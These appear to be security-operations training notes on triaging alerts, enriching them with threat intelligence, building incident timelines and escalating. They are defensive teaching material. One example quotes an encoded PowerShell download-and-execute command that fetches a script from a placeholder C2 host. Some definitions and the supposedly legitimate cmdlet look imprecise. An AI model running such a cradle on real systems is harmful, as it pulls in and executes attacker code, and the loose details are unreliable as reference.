Elaborated Notes with Examples
1. True Positive vs False Positive vs Benign Positive

A True Positive (TP) is a correctly identified malicious event. A False Positive (FP) is an alert triggered by legitimate activity — common with broad rules. A Benign Positive (BP) is malicious activity that was blocked by security controls but still generates an alert (expected and acceptable).

Example (TP): Alert: "Powershell encoded command execution" — powershell -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=. Decoded: IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1'). This is a confirmed True Positive.
Example (FP): Same rule triggers for powershell -Enc UwBlAHQALQBBAFAAUABhAHkAbABvAGEAZAAgAC0ARgBvAHIAYwBlAA== which decodes to legitimate PowerShell Set-APPayload -Force used by the IT deployment tool. This is a False Positive — the rule needs tuning.
2. Enrichment with Threat Intelligence

Enrichment adds context to alerts: IP reputation (VirusTotal, AbuseIPDB), domain age (WHOIS), file hash lookups (VT Community Score), and correlation with known campaigns. This separates commodity malware from targeted attacks.

Example: Alert shows outbound connection to 185.130.5.201:443. Analyst enriches via VirusTotal: IP has 12 detections tagged "Cobalt Strike C2," first seen 3 days ago, associated domains mal-update[.]com and cdn-verify[.]net. WHOIS shows domains registered via Njalla (privacy registrar) using a disposable email. AbuseIPDB reports 47 abuse complaints. Threat intel confirms this IP is associated with the "TA577" phishing campaign. Enrichment elevates the alert to SEV-1.
3. Timeline Building

Timeline reconstruction orders events chronologically across all log sources (endpoint, network, auth, email). It identifies the first compromise, lateral movement, persistence mechanisms, and data exfiltration. Essential for root cause analysis.

Example (Timeline):
08:45:22 — Email gateway: phishing@evil.com -> john@corp.com [Invoice.docm] DKIM=FAIL
08:46:10 — EDR: WINWORD.exe spawned cmd.exe [Event ID 1]
08:46:12 — EDR: cmd.exe -> powershell.exe [Event ID 1]

4. Escalation Criteria

Not every alert needs escalation. Criteria include: critical asset involved (DC, SQL, mail server), active C2 beacon (outbound to known malicious IP), lateral movement detected, data exfiltration indicators, privilege escalation, or ransomware indicators (mass file encryption, ransom notes).

Example: Alert: "Suspicious scheduled task created" on a file server. The task WindowsUpdateTask runs powershell -enc ... as SYSTEM every 15 minutes. Escalation criteria met: (1) runs as SYSTEM, (2) uses encoded PowerShell, (3) persists via scheduled task — all three indicate a sophisticated compromise. The analyst escalates to Tier 2 with the timeline and IOCs. Tier 2 finds C2 beaconing and initiates containment (isolate the host, block C2 IP on firewall).
